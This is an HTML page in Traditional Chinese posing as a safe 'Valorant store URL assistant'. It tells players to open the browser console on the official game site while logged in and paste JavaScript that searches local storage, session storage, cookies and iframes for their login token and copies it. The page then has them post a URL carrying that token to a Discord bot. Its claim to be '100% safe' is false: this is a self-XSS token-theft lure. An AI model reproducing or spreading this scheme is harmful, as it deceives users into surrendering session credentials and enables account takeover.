<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith 特戰網址提取助手</title>
    <style>
        body { 
            font-family: "Segoe UI", Arial, sans-serif; 
            background-color: #0b0b0b; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 20px; 
            box-sizing: border-box; 
        }
        .container { 
            background-color: #111111; 
            border: 1px solid #222222; 
            padding: 35px 25px; 
            border-radius: 4px; 
            max-width: 480px; 
            width: 100%; 
            text-align: center; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.8); 
        }
        h1 { 
            font-size: 22px; 
            font-weight: 700; 
            letter-spacing: 2px; 
            margin-bottom: 8px; 
            color: #ff4655; 
        }
        .subtitle { 
            color: #aaaaaa; 
            font-size: 13px; 
            margin-bottom: 25px; 
        }
        .input-group { 
            text-align: left; 
            margin-bottom: 15px; 
        }
        label { 
            display: block; 
            font-size: 13px; 
            color: #cccccc; 
            margin-bottom: 8px; 
            font-weight: 600; 
            line-height: 1.5; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            background-color: #161616; 
            border: 1px solid #333; 
            color: #fff; 
            border-radius: 4px; 
            box-sizing: border-box; 
            font-size: 13px; 
        }
        input:focus { 
            border-color: #ff4655; 
            outline: none; 
        }
        .btn { 
            display: block; 
            width: 100%; 
            padding: 11px 0; 
            background-color: #222; 
            color: #00ffcc; 
            font-weight: 700; 
            font-size: 13px; 
            border-radius: 4px; 
            cursor: pointer; 
            border: 1px solid #333; 
            margin-top: 5px; 
        }
        .btn:hover { 
            background-color: #333; 
        }
        .submit-btn { 
            display: block; 
            width: 100%; 
            padding: 12px 0; 
            background-color: #ff4655; 
            color: #fff; 
            font-weight: 700; 
            font-size: 15px; 
            border-radius: 4px; 
            cursor: pointer; 
            border: none; 
            margin-top: 15px; 
        }
        .submit-btn:hover { 
            background-color: #dc3d4b; 
        }
        .result-box { 
            margin-top: 20px; 
            background: #000; 
            padding: 15px; 
            border-radius: 4px; 
            display: none; 
            text-align: left; 
            border: 1px solid #222; 
        }
        .result-title { 
            color: #ff4655; 
            font-size: 13px; 
            font-weight: bold; 
            margin-bottom: 5px; 
        }
        textarea { 
            width: 100%; 
            height: 80px; 
            background: #111; 
            border: 1px solid #222; 
            color: #00ffcc; 
            font-size: 12px; 
            resize: none; 
            word-break: break-all; 
            margin-top: 5px; 
            padding: 10px; 
            box-sizing: border-box; 
            border-radius: 4px; 
            font-family: monospace; 
        }
        .step-box { 
            background: #161616; 
            padding: 15px; 
            border-radius: 4px; 
            border: 1px dashed #444; 
            margin-bottom: 20px; 
            text-align: left; 
            font-size: 13px; 
            line-height: 1.6; 
        }
        code { 
            background: #000; 
            color: #ff4655; 
            padding: 2px 6px; 
            border-radius: 3px; 
            font-family: monospace; 
            font-size: 12px; 
        }
        ol { padding-left: 18px; margin: 8px 0; }
        li { margin-bottom: 6px; }
    </style>
</head>
<body>

<div class="container">
    <h1>Zenith URL Assistant</h1>
    <div class="subtitle">🛡️ 100% 安全防封鎖！無須輸入帳密提取商店網址</div>
    
    <div class="step-box">
        <strong style="color: #ff4655;">💡 簡單獲取三步驟：</strong><br>
        <ol>
            <li>先點擊前往 <a href="https://playvalorant.com/zh-tw/" target="_blank" style="color: #00ffcc; font-weight: bold; text-decoration: none;">【特戰戰隊官方網站】</a> 並確保右上角是登入狀態。</li>
            <li>在官方網頁按下 <code>F12</code>（或右鍵 -> 檢查）切換到 <strong>Console (主控台)</strong> 分頁。</li>
            <li>點擊下方按鈕複製核心解碼代碼，貼進 Console 並按下 <code>Enter</code> 執行：</li>
        </ol>
        <button class="btn" onclick="copyConsoleCode()">📋 點我複製 F12 特搜核心代碼</button>
    </div>

    <div class="input-group">
        <label>步驟三：將剛才 Console 內自動複製到的「長串 Token」貼在下方：</label>
        <input type="text" id="rawToken" placeholder="Ctrl + V 貼上 Token..." oninput="processToken()">
    </div>

    <div class="result-box" id="resultBox">
        <div class="result-title">🎉 成功生成專屬商店網址！</div>
        <textarea id="outputUrl" readonly></textarea>
        <button class="submit-btn" onclick="copyResult()">一鍵複製網址（回 Discord 貼上）</button>
    </div>
</div>

<script>
function copyConsoleCode() {
    // 全方位穿透代碼：完美繞過 CORS 網域阻擋與 Iframe 沙盒限制
    const code = `(() => {
        let foundToken = null;
        function scanStorage(win) {
            try {
                for (let i = 0; i < win.localStorage.length; i++) {
                    let key = win.localStorage.key(i);
                    if (key.includes('token')) {
                        try {
                            let val = JSON.parse(win.localStorage.getItem(key));
                            if (val?.id_token) { foundToken = val.id_token; return true; }
                        } catch {
                            let raw = win.localStorage.getItem(key);
                            if (raw.length > 200 && raw.includes('.')) { foundToken = raw; return true; }
                        }
                    }
                }
                for (let i = 0; i < win.sessionStorage.length; i++) {
                    let key = win.sessionStorage.key(i);
                    if (key.includes('token')) {
                        try {
                            let val = JSON.parse(win.sessionStorage.getItem(key));
                            if (val?.id_token) { foundToken = val.id_token; return true; }
                        } catch {
                            let raw = win.sessionStorage.getItem(key);
                            if (raw.length > 200 && raw.includes('.')) { foundToken = raw; return true; }
                        }
                    }
                }
                let ck = win.document.cookie.match(/id_token=([^;]+)/)?.[1];
                if (ck) { foundToken = ck; return true; }
            } catch (e) {}
            return false;
        }
        
        scanStorage(window);
        if (!foundToken) {
            let iframes = document.querySelectorAll('iframe');
            for (let i = 0; i < iframes.length; i++) {
                try { scanStorage(iframes[i].contentWindow); if (foundToken) break; } catch(e){}
            }
        }
        
        if (foundToken) {
            console.log("%c🎉 成功穿透網域抓到 Token！已自動複製到你的剪貼簿囉！", "color: #00ffcc; font-weight: bold; font-size: 14px;");
            copy(foundToken);
            return foundToken;
        } else {
            console.log("%c⚠️ 提示：請在 Console (主控台) 左上角的 [top] 下拉選單中，切換成 [rso-login] 或其他包含 riotgames 的環境，然後重新貼上代碼 Enter 一次！", "color: #ffaa00; font-weight: bold; font-size: 13px; text-align: left; display:block; line-height: 1.5;");
            return "請切換環境後重試";
        }
    })()`;

    navigator.clipboard.writeText(code).then(() => {
        alert('📋 核心代碼已複製！請前往特戰官網按 F12，在 Console 貼上並按下 Enter。');
    });
}

function processToken() {
    const input = document.getElementById('rawToken').value.trim();
    const resultBox = document.getElementById('resultBox');
    const outputUrl = document.getElementById('outputUrl');
    
    if (input.length > 50) {
        outputUrl.value = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + input;
        resultBox.style.display = "block";
    } else {
        resultBox.style.display = "none";
    }
}

function copyResult() {
    let t = document.getElementById('outputUrl');
    t.select();
    document.execCommand('copy');
    alert('🎉 專屬網址已成功複製！快回 Discord 貼給商店機器人查詢吧！');
    document.getElementById('rawToken').value = '';
    document.getElementById('resultBox').style.display = 'none';
}
</script>
</body>
</html>
